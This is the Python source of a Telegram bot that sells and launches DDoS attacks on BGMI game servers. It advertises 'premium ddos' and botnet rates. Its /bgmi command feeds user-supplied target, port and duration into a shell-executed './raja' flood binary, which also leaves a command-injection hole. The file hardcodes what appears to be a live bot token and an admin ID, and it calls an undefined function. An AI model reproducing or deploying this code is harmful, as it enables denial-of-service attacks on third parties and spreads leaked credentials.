import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('8018332397:AAESXrCBWibwYKRS_tAYKdla3Wpdh6pcnck')

# Admin user IDs
admin_id = {"6434780221"}

# File to store allowed user IDs
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

bgmi_cooldown = {}
COOLDOWN_TIME = 0  # Cooldown time in seconds (5 minutes)
feedback_pending = {}
BANNED_USERS = set()


def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    with open(LOG_FILE, "a") as file:
        file.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Time: {time}\n")

def clear_logs():
    with open(LOG_FILE, "w") as file:
        file.truncate(0)
    return "Logs cleared successfully ✅"

@bot.message_handler(commands=['when'])
def check_cooldown(message):
    user_id = str(message.chat.id)
    if user_id in bgmi_cooldown:
        time_elapsed = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
        time_remaining = max(COOLDOWN_TIME - time_elapsed, 0)
        minutes, seconds = divmod(time_remaining, 60)
        response = (f"🛡️✨ *『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 』* ✨🛡️\n\n"
                    f"👤 *𝙐𝙨𝙚𝙧:* {message.from_user.first_name}\n"
                    f"🎯 *𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠𝙨:* `1` ⚔️\n"
                    f"⏳ *𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙏𝙞𝙢𝙚:* `{minutes} min {seconds} sec` 🕒\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    "🚀 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 𝘼𝙉𝘿 𝙒𝙄𝙉 𝙏𝙃𝙀 𝘽𝘼𝙏𝙏𝙇𝙀!* ⚡")
    else:
        response = "You have not run any attack yet."
    bot.reply_to(message, response)

@bot.message_handler(commands=['reset'])
def reset_attacks(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bgmi_cooldown.clear()
        response = "All attack cooldowns have been reset."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['feedback'])
def feedback(message):
    user_id = str(message.chat.id)
    if user_id in feedback_pending:
        del feedback_pending[user_id]
        response = "Thank you for your feedback! 👍"
    else:
        response = "You did not have a pending feedback request."
    bot.reply_to(message, response)

    
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)
 # Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 181:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./raja {target} {port} {time} 1200"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = " You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️❄️this is high quality premium ddos❄️❄️.
🤖Try To Run This Command : /help'''
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['banlist'])
def show_ban_list(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if BANNED_USERS:
            response = "🚫 *Banned Users:*\n" + "\n".join(BANNED_USERS)
        else:
            response = "No users are banned."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['unban'])
def unban_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            banned_user = command[1]
            if banned_user in BANNED_USERS:
                BANNED_USERS.remove(banned_user)
                response = f"User {banned_user} has been unbanned."
            else:
                response = "User is not banned."
        else:
            response = "Specify a user ID to unban."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

def enforce_feedback():
    now = datetime.datetime.now()
    to_ban = []
    for user_id, timestamp in feedback_pending.items():
        if (now - timestamp).seconds > 600:  # 10 minutes timeout
            BANNED_USERS.add(user_id)
            to_ban.append(user_id)
    for user in to_ban:
        del feedback_pending[user]

@bot.message_handler(commands=['feedback'])
def send_feedback_photos(message):
    photos_directory = "feedback_photos"  # Directory where feedback images are stored
    if os.path.exists(photos_directory):
        photos = [f for f in os.listdir(photos_directory) if f.endswith(('png', 'jpg', 'jpeg'))]
        if photos:
            for photo in photos:
                with open(os.path.join(photos_directory, photo), 'rb') as img:
                    bot.send_photo(message.chat.id, img)
        else:
            bot.reply_to(message, "No feedback photos available.")
    else:
        bot.reply_to(message, "Feedback directory does not exist.")

while True:
    try:
        enforce_feedback()
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

